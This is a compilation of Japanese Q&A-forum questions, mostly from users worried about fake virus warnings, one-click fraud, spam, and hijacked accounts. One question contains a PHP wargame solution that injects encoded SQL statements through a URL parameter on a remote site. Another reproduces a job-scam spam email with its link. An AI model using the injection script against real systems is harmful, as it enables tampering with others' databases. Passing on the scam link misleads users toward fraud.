ワンクリック詐欺に引っかかりました。 タップした途端、勝手に「会員登録が終了しました」といった内容の長文が出てきて、勝手にどこかの電話番号へ発信させられそうになりました。慌ててスリープモードを押してしまい、その後すぐにつけてからそのページを消しました。その後、「履歴とWebサイトデータを消去」を押しました。実際に発信されたかどうかは不明です。 これってどこまで相手に情報が渡ってしまいましたか？電話番号くらいはバレたでしょうか？ 大丈夫でしょうか？今からでもできる対策はありますか？ 回答よろしくお願いします。
Googleで雑誌について検索していて、ページを押したら、このページにはウイルスが感染している可能性があります！！！ウィンドウを閉じないで下のGoogleアプリからウイルス感染対策アプリをダウンロードして下さい！！！(ウィンドウ閉じた場合は自己責任です)、と出てきて無視してもう自分でダウンロードしていたアプリでアンチ検索して何も無かったんですけど、これって無視しても大丈夫でしたか？？ こういう系に詳しい方、なったことがある方教えて欲しいです！
最近自分のメールアドレスからの迷惑メールが増えて困っています。そこで質問なのですが、これは自分のメルアドに偽装されて送られてきたものなのか、 それとも、何らかの理由でアドレスとパスワードが漏洩して実際に自分のメールアカウントが乗っ取られて送信されているのかどうか知りたいです。 以下がヘッダーを含めた全文です。どなたか偽装か乗っ取りか見分けられませんでしょうか？ もし、偽装なら、迷惑メールフィルタなどを活用し、無視しておこうと思いますが、 漏洩であれば対応したいと思います。 ちなみにメールサーバーはlolipopを使用しております。 Return-Path: <自分のメールアドレス> X-Original-To: 自分のメールアドレス Delivered-To: 自分のメールアドレス Received: from mail318.phy.lolipop.jp (localhost [127.0.0.1]) by mail318.phy.lolipop.jp (Postfix) with ESMTP id E58DA1D00478 for <自分のメールアドレス>; Sat, 23 Jul 2016 06:25:32 +0900 (JST) Received: from 172.19.44.37 (172.19.44.37) by mail318.phy.lolipop.jp (LOLIPOP-Fsecure); Sat, 23 Jul 2016 06:25:32 +0900 (JST) X-Virus-Status: clean(LOLIPOP-Fsecure) Received: from mx-proxy002.phy.lolipop.lan (HELO mx-proxy002.phy.lolipop.jp) (172.19.44.37) by mx-proxy002.phy.lolipop.jp (qpsmtpd/0.82) with ESMTP; Sat, 23 Jul 2016 06:25:32 +0900 Received: from 223.176.181.101 (223.176.181.101) by mx-proxy002.phy.lolipop.jp (LOLIPOP-Fsecure); Sat, 23 Jul 2016 06:25:27 +0900 (JST) X-Spam-Status: Yes(LOLIPOP-Fsecure) with VIRUSGW/SPAM_RBL/223.176.181.101[bl.spamcop.net:127.0.0.2] Message-ID: <522FA8FCDBD57B8FF275210608A6522F@DY1ONUO82> From: <自分のメールアドレス> To: <自分のメールアドレス> Subject: hi! Date: 23 Jul 2016 06:26:26 +0400 MIME-Version: 1.0 Content-Type: multipart/alternative; boundary="----=_NextPart_000_0017_01D1E48D.05C36393" X-Priority: 3 X-MSMail-Priority: Normal X-Mailer: Microsoft Outlook Express 6.00.2900.5931 X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2900.5931 ここまでがヘッダー情報です This is a multi-part message in MIME format. ------=_NextPart_000_0017_01D1E48D.05C36393 Content-Type: text/plain; charset="cp-850" Content-Transfer-Encoding: quoted-printable Hello! We are looking for employees working remotely. My name is Rosendo, I am the personnel manager of a large International = company. Most of the work you can do from home, that is, at a distance. Salary is $2500-$5000. If you are interested in this offer, please visit=20 Our Site Best regards! ------=_NextPart_000_0017_01D1E48D.05C36393 Content-Type: text/html; charset="cp-850" Content-Transfer-Encoding: quoted-printable <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"> <HTML><HEAD> <META http-equiv=3DContent-Type content=3D"text/html; charset=3Dcp-850"> <META content=3D"MSHTML 6.00.2900.6058" name=3DGENERATOR> <STYLE></STYLE> </HEAD> <BODY bgColor=3D#ffffff> Hello!

We are looking for employees working remotely.

My name is Rosendo, I am the personnel manager of a large International = company.
Most of the work you can do from home, that is, at a distance.
<b>Salary is $2500-$5000.</b>

If you are interested in this offer, please visit <a = href=3D"http://adoratebco.com/modules/mod_cmscore/"><b>Our = Site</b></a>

Best regards!
</BODY></HTML> ------=_NextPart_000_0017_01D1E48D.05C36393--
ネットサーフィンしてたら、【ウィルスに感染しました...OKを押して下さい】みたいなメッセージが出てきました。何もクリックせずにすぐページを閉じ、全部のウィンドウ？を閉じて電源切って再起動しました。 その後迷惑メールがたくさん送られてきました。 これは私の情報が漏れたという事ですか？ 電話はかかって来てないし、名前が知られてるわけではなく、ただ迷惑メールがいっぱい来ます。 メールが来るのは、変なメッセージのせいですか？ 情報はどこまで漏れているんですか？ よろしくお願いします。
無線ランのＩＰアドレス固定で使用していましたが、不審者の親友の気配を感じた後に確認したら自動設定に変更されていました。これは不審者の侵入の証拠になりますか？
メイプルストーリーでのウェブシステムアカウントの取得方法について・・・。 20代男性です。オンラインゲーム、メイプルストーリーを運営されてる方、答えて頂けたら嬉しいです。自分は最近、高額の賞金が欲しくて、オンラインゲームをプレイするだけでお金を稼ぐ事って出来ないかなと思いネットで調べてみたら、メイプルストーリーのプレイ時間帯でお金を稼ぐ事が出来ると書いてあったので、これは素晴らしい早速登録しようと思いましたが、メイプルストーリーのプレイ時間帯だけで稼ぐ為には、なんでもウェブシステムアカウントとゲームアカウントの取得と、その二つのアカウントを結び付ければ稼げると書いてありまして、そのウェブシステムアカウントは何処で手に入れる事が出来るのかが全く分からないんです。ウェブシステムアカウントは、何処で取得出来るのでしょうか？どうか、教えて下さい。宜しくお願い致します。
私、36歳。相手の女性25歳。今週の土曜日に愛知県半田市にある、シャンドールというパフェが有名なお店に車で行くことになりました。 今の季節、桃のパフェが食べたいということで、前から連れてって欲しいと言われてました。 ネットで確認すると、シャンドールというお店は予約は出来ないし、2時間くらい待たなければいけないと書いてありました。 半田付近でどこか時間つぶせるような所はありませんか？
ネットワーク構築のパズルです。 所有している機材を組み合わせてネットワークの勉強をしているのですが、色々やり過ぎて混乱しております。下記機材とVLANを駆使して「セキュリティーが高い」「メンテナンス性が良い」「効率的な通信」などを考慮し、実際の現場でも通用するようなネットワークを構築してみたいのです。 -------------------------------------------- ルーター：YAMAHA NVR500 ファイアウォール：Fortigate 60C L2スイッチ：YAMAHA SWX2200-8G L2スイッチ：NETGEAR GS116E 無線AP：Buffalo WAPS-AG300H 外部DNS・WEB兼用サーバ（LINUX） 内部DNS・DHCP兼用サーバ（LINUX） ファイルサーバ（FreeNAS） デスクトップPC ノートPC スマホ・タブレットなど -------------------------------------------- 想定している条件としては、 1.外部からIPSecで全てのクライアントに接続できること 2.客人用の無線セグメントを用意して、サーバ類には接続できなくする 3.ファイアウォールポリシーなどはセグメント単位で簡単に実施したい 4.通信時に各機械にかかる負担をできるだけ抑えたい 5.可能であれば、ひかり電話も使いたい（無くても可） です。 全ての機械を使う必要はありません。 皆さんならどうしますか？
柴犬のエサで、ネットにホームセンターのは絶対駄目と書いてありましたが、やはり安いのは良くないの？
mp3のデータ内に個人情報が入り込んでしまうことはあるのか？つくった曲をネットにupしようと思うのですが （アップローダーにあげ、ダウンロードできるようにする） mp3のデータ内に自分のPcの情報が入り込んでいるのか 気になっております。 「情報を見る」を見てみると、共有とアクセス権のところに ユーザーネームが入っております。 これは他のPcで見た時にはそのPcのユーザーネームが 入るのでしょうか？ macです。
MBSAのパッチを一括で適用したいです。 MBSAのパッチを一括で適用したいのですが方法がわかりません。調べてもわかりづらいのばかり。わかりやすく教えてください！！
どうしましょう。ネットが開けません！
GALAXYのＳ７使ってるんですけど、ほんとしょっちゅう｢あなたのスマートフォンはウイルスに感染しています、このぺージを閉じた場合は自己責任です、解決のためにはこちら、あと〇分〇〇秒｣って警告文が出てくるんです。 それで、こちら、ってとこをタップ？したらGoogleストアのアプリが出てきて...。Nortonでは問題なし、って出てきたんですが。。 姉には｢これがウイルスじゃないの笑｣と言われたんですが笑笑 本当に感染しているんでしょうか？？ スクリーンショットでも撮っとけば良かったんでしょうが......。 詳しい方、アドバイス？お願いします！！
遠隔操作ウイルスでしょうか？解決策を教えてください。友達に動画を送りたくて、動画の形式を書き換えるフリーソフトをいくつかインストールしたためウイルスをもらってしまったと思います。 PCについて詳しくないので間違ってることもあるかと思いますが、症状などを書いていきます。 ①googleのタブが大量に開く(そのままフリーズしてしまう程) ②PC起動してパスワード入力の画面で何も押していないのに、「パスワードが違います」と表示される(パスワードを何度か試されてる気がする) ③PC起動ロゴ画面で止まる(起動画面でF2を押して初期化に挑むも変なエラー表示が高速で出たり消えたしてフリーズ)←このときは無線LANを接続していた ④無線LANを根本から切るとやっと自分で操作できるようになったので、設定から初期化(出荷状態に戻す)を選択しました。焦っていたのでウイルスの原因のソフトがわからぬまま初期化中←今ここです 出荷状態に戻ってもウイルスがあるかどうかはわからないかもしれないですが、再感染するウイルスだった場合業者さんに頼むことはできますか？買い替えになりますか？ 無線LANに感染していたら家族のパソコンにも移りますか？ 説明不足なところもあるかと思いますが、回答お願いします。
一般的な会社のネットセキュリティについて教えて下さい。 たとえば、会社PCで個人のGmailにログインした場合それはばれることがあるのでしょうか。 また、ばれるとしたらなにか問題が起きたさいに過去の履歴をさかのぼった結果、副次的にばれる、ということでしょうか。 であれば、ログインした履歴がばれるだけで、その中身はばれない、ということでしょうか？ まあ何がいいたいかって、会社PCでクロムのシークレットモードでGmailログイン、メール作成画面で個人的なメールを書いて保存、個人携帯からログインして送信だけするみたいなことをすることがあります。 やっぱりパソコンのが楽なので、、、仕事中にやってるわけじゃないですよ。 これなら暗号化されてるし、そもそも送信はしていない(ネット上に発信したことにならない)ので大丈夫かな？って思ってるんですが、実際セキュリティに携わっているかた、どのへんまで管理されているか教えて頂けますでしょうか。 想定される解答としては ・作成した内容まで全てばれてる。なんならパスワードもばれてる ・個人Gmailにログインしたってとこまでばれてるが、内容まではみれてない ・そもそもシークレットモードでみてるなら、通常わからない。なにかあったときに副次的にばれるかも。 こんなところかなと思いますが、宜しくお願いします。
この前、ピクシブにログインして 小説や絵を見ながら、別のタブを開いて色々なまとめサイトを見てたんですけど あるまとめサイトをクリックしたら「これは安全でないことが報告されている Web サイトです」という 色々書いてある警告文が出てきたんですが ピクシブのパスワードやパソコンの個人情報などが漏れたりはしないですよね？ かなり不安です
僕の名前は「樹（いつき）」で自分のハンドルネームを考えたんですけど思いつかなくて…いつもネットで使う名前は「ITSUKI」にしているのですが、これだと名前がバレるので嫌なんです。 なので僕のハンドルネームを考えて下さい。 お願いします！！
今日からONE PIECEの映画の座席指定できたので急いで行ってきたら エグゼクティブシート１つ以外 全部売り切れ。 私が行った時間は11時半くらい！ AEONの映画館は多分9時か10時くらいやろ？ なんでそんなすぐ売り切れるの ︎ ネットで頼めるんですか ︎ てか３日前じゃないと座席指定 できないんじゃないの ︎ もしネットで座席指定できるなら 教えてください！
緊急！！！8946でtake24 http://www.hackerschool.jp/hack/take24.php この問題の解説を読んでphpを書いてみたんですがどうもゴール目前で止まってしまいました。 そこで、このphpのどこが悪いのか教えてください。 あとコメントアウトが必要な部分も教えてください。お願いします。 その問題のphpっていうのがこちらです。 <?php set_time_limit(0); $ary[] = 3; $ary[] = 6; $ary[] = 8; $ary[] = 16; $ary[] = 18; $ary[] = 27; $ary[] = 28; $ary[] = 31; $ary[] = 33; $ary[] = 35; $ary[] = 39; $ary[] = 43; $ary[] = 47; $ary[] = 49; $ary[] = 52; $ary[] = 53; $ary[] = 59; $ary[] = 62; $ary[] = 63; $ary[] = 64; $ary[] = 66; $ary[] = 67; $ary[] = 68; $ary[] = 75; $ary[] = 77; $ary[] = 79; $ary[] = 86; $ary[] = 89; $ary[] = 91; $ary[] = 94; $ary[] = 95; $ary[] = 97; $ary[] = 101; $ary[] = 102; $ary[] = 103; $ary[] = 105; $ary[] = 124; $ary[] = 130; $ary[] = 131; $ary[] = 132; $ary[] = 134; $ary[] = 136; $ary[] = 142; $ary[] = 145; $ary[] = 155; $ary[] = 156; $ary[] = 158; $ary[] = 163; $ary[] = 164; $ary[] = 167; $ary[] = 168; $ary[] = 169; $ary[] = 171; $ary[] = 175; $ary[] = 176; $ary[] = 177; $ary[] = 182; $ary[] = 187; $ary[] = 194; $ary[] = 195; $ary[] = 197; $ary[] = 200; $ary[] = 208; $ary[] = 210; $ary[] = 213; $ary[] = 214; $ary[] = 218; $ary[] = 219; $ary[] = 222; $ary[] = 223; $ary[] = 224; $ary[] = 226; $ary[] = 234; $ary[] = 238; $ary[] = 262; $ary[] = 270; $ary[] = 271; $ary[] = 272; $ary[] = 280; $ary[] = 282; $ary[] = 283; $ary[] = 284; $ary[] = 285; $ary[] = 286; $ary[] = 289; $ary[] = 290; $ary[] = 293; $ary[] = 295; $ary[] = 299; $ary[] = 300; $ary[] = 301; $ary[] = 308; $ary[] = 309; $ary[] = 310; $ary[] = 316; $ary[] = 319; $ary[] = 321; $ary[] = 322; $ary[] = 331; $ary[] = 333; for($i=0;$i<100;$i++){ $insert_sql = "INSERT INTO history (member_id,book_id,date) VALUES ('151',".$ary[$i].",UNIX_TIMESTAMP(NOW()))"; $rot47sql = str_rot47($insert_sql); $sql[$i] = url_to_encode($rot47sql); } for($i=0;$i<100;$i++){ $url = 'http://whitecafe.moe.hm/public_html/books.php?sql='.$sql[$i]; $headers = array( 'Referer: http://whitecafe.moe.hm/public_html/books.php' ); $options = array('http' => array( 'method' => 'GET', 'header' => implode("\r\n", $headers), )); $check = file_get_contents($url,false,stream_context_create($options)); if($check){ echo"
OK:".$i."回目"; } } print_r($sql); $pass = "hNupNRhY"; $password = sha256Stretch($pass); $sql = "SELECT book_id,from_unixtime(date) ,scrap FROM books WHERE scrap = 0 and date <UNIX_TIMESTAMP(NOW()) LIMIT 100;"; $rot47 = str_rot47($sql); url_to_encode($rot47); function sha256Stretch($password) { $key = $password; for ($i = 0; $i < 10000; $i++) { $key = hash('sha256', $key); } return $key; } function url_to_encode($a){ $conv = urlencode($a); print $conv; } function url_to_decode($a){ $de_conv = urldecode($a); return $de_conv; } function str_rot47($str){ return strtr($str, '!"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~', 'PQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~!"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNO'); } ?>
このウインドウ、よくでてくるのですが、操作の邪魔になっていて・・・ 出てこないよう設定することはできないでしょうか？
大きいシステムってなんですか？ 銀行システム、保険システム、流通システム、ヤフー、グーグル、医療システム、証券システム、製造業システム。などなどいろ
よく私は可愛いですかとかかっこいいですかと自分の写真を乗っけていますがネットに顔写真を投稿するって危なないのでしょうか？
私はiPhone5sを持っていたのですが、そのiPhone5sがつい最近故障してしまいしまた。 それに怒った親が私の携帯を解約してしまいした。 他の端末からtwitterに ログインしようとしたのですが ログイン認証というものをしてしまって ログインできません。 ログイン認証の番号は携帯番号に 送られるのですが、 携帯番号は解約されているので、 見ることができません。 どうしたらtwitterにログインすることが できるでしょうか？ もう無理なのでしょうか？ 文章下手くそですみません。
カスペルスキーをパソコンに入れてからゲームが出来なくなってしましました。 そのゲームはエイジオブエンパイアコンカラーです。 立ち上がりもしないです。パソコンに疎くセキュリティーだけはしっかりをと思い 購入したものでまだ２年以上ライセンスも残っていますのでどうしたものかと。 ネットで見ているとその時だけセキュリティーソフトを停止すればとありましたが 怖くて出来ません。よろしくお願いします。
至急お願いします。いつものようにネットを見ていたら、２つウィルスに感染しているという内容のものが出てきました。 ５分以内にアプリをインストールし、最低３日間はそのアプリをアンインストールしないようにということが書かれていました。タイマーのようなものも表示されていました。 戻ろうとしたのですが、警告が出て、戻るのは自己責任だと言われました。 変なサイトは見た覚えがありません。 そのとき、私は星座占いのサイトを見ていました。 また、確認しようと思ってタブを開いたのですが、残っていませんでした。 もう５分は過ぎたのですが、そのアプリをインストールした方が良かったのでしょうか？ ちなみに過去にも１度ありましたが、今まで特に何もなく使用していました。
いつも通りネットをいじっていたら、何もしていないのにウェブ利用制限が出て、今まで見れたサイトが突然見れなくなってしまいました。この場合はどうすれば良いのでしょうか？
他の人が作った、ホームページ、ブログ、サイトにアクセスした人のIPアドレスを製作者とは関係のない人が取得する事は可能ですか？
どれくらいの素顔をネットに乗せたら住所など個人的なことを特定されますか？例えば ・眼鏡、マスクなどのアクセサリーつけてる ・上、下など撮影位置 ・太陽、逆光 …などで見えにくくなってる場合です。
iPhone6sをつかっていますセキュリティ質問を忘れて課金できません ネットで調べましたが、ネットの方法ではできませんでした。 わかる方、詳しく説明お願いします！
EXOとかのK-POPアプリ？のWe date+を入れたのですが、英語と中国語でわからないし、パスワードを入れてもダメとでるしget a testcodeというのでやっても中国語で失敗と出てしまいます。どうやってログインするのですか？
ネットのウイルス（詐欺のページ）などについての質問です。とあるアニメで、「オンラインゲームに主人公がログインしようとして、一度IDとパスワードが弾かれて、主人公は入力ミスをしたかなと思って、再入力した。→そのパスワード等が乗っ取られた」という内容の回がありました。 アニメでは、別アカウントを取って、運営に働きかけ解消していました。 このような、入力して弾かれてパスワード等が盗まれるということはあるのでしょうか。 先ほど、スマホで似たような現象※になり、調べるにも調べるためのワードが分からなくて困っております。 対処をすべきかしなくてもいいべきか。 するなら、どのような対処か。 この辺りをお教えいただけないでしょうか。 ※詳細は以下になります。 おとといの話。 →WEBでほしいグッズの検索をしていて、あるサイトにアクセス(今までアクセスしたことのないサイト)にアクセスしたら、突然POPアップで「あなたのスマホは２つのウイルスに感染しています」的な文言と、そのPOPアップの後ろに5分間のカウントダウンがありました。 この場では、焦って何かしたら詐欺サイトか何かに引っかかると思って、そのまま画面を閉じました。 昨日の話 →ヤフオクで商品を落札しました。 かんたん取引ではない、旧の取引です。スマホで取引してました。 かんたん決済で、支払いをしようと、通常通りの「かんたん決済支払いへ」を選択し、いつも通りの「パスワード等の再確認の画面」が立ち上がりました。 いつも通り入力後、「ログイン」を押しました。 すると、見たことのあるようなないような感じの緑系のカードローンか何か(詳細覚えていなく、スクショも撮らず)のページ【謎のページとします】に飛びました。 入力を間違えたor変なところを押したかと思い、焦って戻って再入力し、ログインすると、普通に入れたので決済しました。 そのあと、よくよく考えると、パスワード等の再確認の画面には1つのリンクを除いて外部リンクがないのを思い出したので、どことなく不安に感じました。 1つのリンクは、のちに見ましたが、謎のページではありませんでした。 そのあとに、初めてウイルスバスター的なアプリをダウンロードしてスキャンし、異常なしで、 ヤフオクは、パスワードを変えました。 かんたん決済には、クレジットカードの入力画面があります。 クレジットカードは、データが予め入力されており、裏面の数字は毎度入力する形ではありますが、 もしデータが抜き取られていたらと思うと不安です。 何かわかる方や、考えられることがわかる方がおられましたらお教えいただけますでしょうか。 検索するにもどこをどう検索したらよいか、分からなかったので、この場にてご質問させていただきました。 長々と申し訳ございませんが、どうか宜しくお願い致します。
初めての質問になりますが、どうかよろしくお願いします。 実はかねてより会社の方からマイナンバー事業への参入企画書を提出するように言われています。しかしネットなどで検索すると税金の公平な徴収のためのものであると書かれているので、実際に事業への参入と言われてもはたして本当に参入できるのか、どんな事業ができるのか何も検討すら付きません。 wakadanna_kazusaya様は他の方への回答の中でビジネスチャンスと書かれていましたので、もしかしたら何かすでに実行に移されているのかと思いワラをも掴む気持ちで質問させて頂いた次第です。 実際問題として、民間企業がマイナンバーに関わることが可能なのでしょうか？ 可能であればどのような事業になるのでしょうか？ 貴社の企業秘密に近い質問であることも、このような質問を質問をしながらIDを伏せているのがはなはだ失礼である事も十分に承知しています。 ご回答を頂けないかもしれませんが、何かヒントになるような事だけでもお教え頂くわけには行きませんでしょうか。 まことに勝手であつかましいお願いでしょうが、何卒よろしくお願い致します。
モンハン4Gが今ネット繋がりません。 メンテナンスですか？
PCのネットワークに接続していないはずの携帯電話のアイコンが表示されました。 すぐ消えてしまったのですがなんだか怖いです。（ハッキングされてないかとか・・・） 詳細はわかりませんが「Lenovo_TAB2_501LV」という表示がしてありました。 どなたかわかる方がいらっしゃいましたら、 これはどういう状態なのか、また今後どう対応したらよいか教えてください。
本屋で売られてる漫画をネットで無料でダウンロードするのは法的、モラル的どちらも違法なのですか？ 色々調べたのですがわかりません...テンプレの回答はもう見てるのでお控えください。
SSL通信の仕組みについて教えてください。 駆け出しのITエンジニアです。 この度従事することになった現場で、SSLについて理解しておく必要があるため勉強中です。基本的なことかもしれませんが以下の疑問点にご回答いただけますでしょうか。 1.クライアントとは認証、クライアントの証明書が有効期限内であるかどうかを確認しているものだと認識してますが、サーバー認証（検証？）とは何を見ているのでしょうか？また、有効期限が切れたものは接続できなくなると思っていますが、サーバー証明書の認証（検証？）に失敗しても接続できなくなるということでしょうか？ 2.証明書にはSHA1とSHA2の二種類があると見ましたが具体的に何が違うのでしょうか？ 3.SSL通信で用いられる証明書はクライアント証明書、サーバー証明書、ルート証明書、中間証明書であると認識していますが、それぞれの用途というか目的について教えてください。 4.SHA1のクライアントがSHA2のサーバーにアクセスすることは可能なのでしょうか。また、その逆のパターンはどうなるのでしょうか。 先輩の話を聞いても全く付いていけず、ネットで調べても理解が追いつかないので諸先輩方に知恵を貸していただきたく… 宜しくお願い致します。
MWリマスターが出るのでMW以降のCoDランキング作ってみました MW>BO≧MW2>BO2>BO3>MW3≧AW>G 私はAW以降はやってない為、ネットでの評価を見て決めたところがあります。 なのでこれはここじゃ無いと思う所は意見ください
コンパイラについて質問です レジスタを多く持つコンピュータは一般に良いコードを生成しやすい。 とよく聞くし、頭の中ではわかっているのですが、その正確な理由がわかりません。 ご教授願えたら幸いです。 よろしくお願いします。
Googleアカウントの不正ログインについて 先程gmailで新しい端末からログインされたという通知が来ました。私が操作したものではなかったので不正ログインだと思われます。 すぐにパスワードを変えたのですが、後から確認すると一週間程前にも別の端末からログインされていました。。。 名前や携帯のメールアドレス、ログインする際に確認する携帯電話番号など、googleのアカウント情報がすべて漏れてしまった可能性があります。 また、家族で共有していたアカウントで、家族のスマホのフォトが自動バックアップ設定になっており、家族の撮った写真も漏れてしまったと考えられます。 パスワードを変える、2段階認証をする、など今後漏れないようにするための行動はできますが、漏れてしまった情報は変えようがありません… こういった時、何から手をつけるべきでしょうか？ 同じような経験のある方がおられたらご教授ください。 ※gmailはスマホでの利用が主です ※クレジットカードの登録はしておりませんでしたので、課金されるなどの心配はありません ※Amazonや楽天などの通販サイトで設定してあるメールアドレスは別のものでしたのでこちらも心配なさそうです
これは、監視カメラなのでしょうか 詳しい方お願いします
次の問題を解いてくれませんか？ IPアドレス133.80.0.0/19で表されるネットワークはいくつのホストに対するアドレスを持つか？
以下のサイトの問7（ネットワークに関する）なのですが 解説がないので解き方がただしいかわかりません。 教えて頂ければ幸いです。 よろしくお願いします。https://www.engineer.or.jp/c_topics/002/attached/attach_2753_7.pdf
【50代中卒無職・元現業職公務員です】 困窮を極める生活と職のない心細さで、ここで公務員を罵倒するのをわずかな心の慰めにしてきました。しかし、YahooのIDから、個人が特定されて、実名など晒されるかも知れないとある人に言れました。そんなことが技術的に可能でしょうか。
ドラマを見ようと、KissAsianというサイトを開いていたら、Windowsセキュリティー＆アンチウィルスサービスでエラーが発生しました、との表示がされ、◯◯にお問い合わせくださいという番号が出ました。電話してみると、365TechAidという会社につながり、Techviewerの遠隔操作のページから遠隔操作をしてもらう形になりました。そして、1年間の補償を申し込むために23000円ほどの振り込みを要請されて、口座番号を聞かれました。 不安になりネットで見てみると、Teamviewerをダウンロードさせて情報を奪う詐欺などがあるとあり、心配になったので一旦電話を切り検討することにしました。 これは安全性に問題はないのでしょうか？
僕のグーグルアカウントに不審なアクティビティが検出されたと通知があったのでアカウントのパスワードを変えたんですがこれで大丈夫なんでしょうか？
ネットでよく見る釣りってやってて楽しいのですか？あとやって何か得はあるのですか？
ぷるるん女神のらくらくコースを解約したいのですが、初回＋3回分を受け取らなければ解約できないと言われました。 ですが私は体に合わず、返金してもらおうと思っていたのですが、ネットで調べたところ3回目の商品を受け取って4回目の発送7日前まで連絡すれば良いと書いてあったので、連絡したところ4回目を受け取って5回目の発送7日前に連絡してくださいと言われました。 5回目の発送7日前に連絡しても返金してもらえるでしょうか？ 長文で読みづらい文章ですがご回答よろしくお願いします。
ＥＣショップから、宛先がアドレス宛様で注文ありがとうございましたとのメールが届きました。メール文にある「せろほかふおては」という訳のわからない言葉は一体なんなのでしょうか？すぐ削除しましたが、無視して大丈夫ですよね。
ハワイアンズ 悠健ポイントカード 7月31日にハワイアンズに行くのですが、悠健ポイントカードが家にあり持って行こうと思いましたが、有効期限が2016年の3月31日まででした。 2つ折りになっていて、有効期限は内側に記載されているのですが、表示するさい、バレるとおもいますか？？ ネットでかうと高くなるので、できれば使いたいのですが…
7年程前に購入したパソコンをネットに繋げたいのですが、セキュリティ面ですべきことは何でしょうか。とりあえず、ノートンとかのセキュリティソフトをインストールしようと思うのですが、Windowのアップデートもしとかないと危ないでしょうか？ パソコンは7年前に発売された富士通のBIBLO NF/E50 で、Window7が入ってます。ネットは普段スマホで使ってるポケットWi-Fiがあるので、それで繋げる予定です。 また上記以外にセキュリティ面ですべきことはありますか？
大至急！こんなのが出ました！どうしたらいいですか？
ウイルスバスター月額版の有効期限が切れたけどどうすればまた使える？
outlook.live、hotmailでメールを送信した際の受信側に表示される（名前）を変えたい。 ネットで検索するもうまくヒットしなくて変更できなくて困っています。ざっくりしているので、もしもう少し情報がとのことでしたらご指摘願います。。。
竹田城のパワースポットは一体何ですか？ネットを見るとユーチューブで鏡石の事が言われてるし、途中の売店のおじさんは櫛だと言われ私は￥4300を払い購入しましたが、宗教みたいな事が書いてありました、不愉快です、櫛を返品したいです、騙された気がします。朝来市で管理してもらえませんか。 なぜパワースポットを聞くのにお金を払わないといけないのでしょうか？
iPhoneに来ていた迷惑メール通知のメール。 そこに載ってるアドレスを間違えて触ってしまい、 メール画面に切り替わったんですが、未送信なら大丈夫ですよね？ 送られてきたメールは、迷惑メールフィルターにあるため中身は見えません。お知らせメールに載ってた 送信元のところにあったアドレスを指が滑ってクリックしてしまいました。 ウィルスとかの感染が心配です。
ネットを見ていたら広告に出てきたエロサイトを押してしまいました。慌てて戻ろうとしたら「有料会員登録されました」という画面が出てきました。 本当にされたんですか？家に請求来ますか？ 30分以内に誤登録された方はお客様サービスに電話しろという表示が出てきたのですが電話するべきですか？ カウントダウンされています。どうすればいいんでしょうか…
キングソフトインターネットセキュリティをアップロードしたら「天気ボール」が付いてきたのですが、温度が明らかに違います。みなさんは正しく表示されていますか？
Googleアカウントのパスワードを忘れたので「パスワードアシスタンスページ」という所でGoogleのメールアドレスを書き、次に進むと下のような質問が返ってきました。「覚えている最後のパスワード」とは一体何のことでしょうか？
Twitterのアカウントがネットで自分の名前検索すると鍵垢なのに出てきます。これってどーすればネットから消せれるんですか ね？？
ネットワークについて質問です どのアプリケーション層プロトコルでも暗号化できるプロトコルは次のうちでどれですか？FTP FTPS HTTPS IPsec Telnet 回答お願いします
ポケモンGO手に入れた方やオーストラリアのAppleID持ってる人に質問です誕生日(？)記入するところで24歳以上にしても 最小の年要件を満たしていないので、アップルIDを作成できません。 と出るのですがどの数字入れれば通過できるでしょうか...
いきなりシステム警告のようなものが出てきました。 偽物だと知っていたのですぐ消しましたがなぜこういうのが出てきたのか不安です。 多分よくわからないアプリだと思います。 ちなみにウイルスバスターfor au は何も反応なしです。スキャンしても何も出ません。 何かわかる方がいましたら回答よろしくお願いします。
iPhone6s を使っています現在は使っていないiPhone5sもWi-Fiに繋げて 一緒に使っているのですが、 マルチタスクを開くとマルチタスク下部に 『 "iPhone"から 』 と出てきました。 その表示から 使っていないiPhoneでsafariで検索した内容が 現在使っているiPhoneで開けるようになっていました。 その場合、 共有をできなくするようにすることは可能ですか？ また、 safariを開きなにかしらのサイトを見てるときは 同じ家に住んでる人全員 わたしの見ているサイトが分かるということですか？
最近ネットの繋がりが悪いです。 ２分ぐらい繋がらなくなる（固まる）時が何度かあります。定期的に繋がらなくなってる気もします。 深夜など、時間問わずに。原因を探そうと思ったらどうしたらいいでしょうか？ ルーターなどがおかしい可能性ありますか？（買って１年ほどです）
こんにちは質問お願いします 先日ＰＣ画面に「アカウントが他の人に使われています」というようなメッセージが出ました。どんな状況なのでしょうか？又どのような対処をすればいいのでしょうか？詳しい方がいらっしゃいましたら教えてください。
いま、私のプリンターがPCに接続できない状態です。コンビニのコピー機でスキャンして、そのデータを私のPCのOutlookのアドレスに送ることできますか？
子供が変なサイトを開いたらしくALERT 0x01921457サイトから警告音が鳴り 16個？だったかな？のウイルスに感染している為、 こちらにご連絡くださいと書いてあり電話番号も載せてありました。×を押しても消えないのでタスクマネージャーで消しているんですが 数日すると同じ画面が出てそれも同じ時間にでてきます。 どうしら削除できますか？ PCの詳しく無い主婦なので分かりやすく教えてください。 警告音が鳴る度、怖くて仕方ありません。
ローカルネットワークの環境で無線LAN専用パソコンにルーター経由で接続していたのですが、Windows8から10にアップグレードしたらネットにつながらなくなりました。画面にビルトインadministratorアカウントを使って、Microsoft Edgeを開けません。別のアカウントでサインインしてやり直して下さい、と表示されてしまいます。どうすればネットにつながるのでしょうか？
よくネットで、不確かな情報出回るじゃないですか大体ソースがTwitterとかその辺りで、何の信頼性も信ぴょう性もない情報を信じられる神経が理解できません。何故信じて拡散したりするのでしょうか？
Windows１０にアップグレードしました。 はじめはイヤホンから、音が出なくなったので ネットで調べ、どうにかイヤホンで音が聞けるように なりました。ところが今度はスピーカーから音が出ません。 又ネットで調べたら、今度はスピーカーからは 出るのにイヤホンからでません。 ウィンドウズ１０て、イヤホンかスピーカー どちらからしか、音を聞けないのでしょうか？ 又、そうでない場合はどのようにすれば よいのでしょうか？ 宜しくお願いいたします。
サイバーパトロールとは 警察がどこのネットワークを見てるのですか？例えばLINEの個人トークやTwitterなど わかるかた教えてください カテゴリがわかりません ごめんなさい。 また、どんなものを送ったら 逮捕されるのですか？ 未成年です。
誰かアカウントバンできる人いますか？
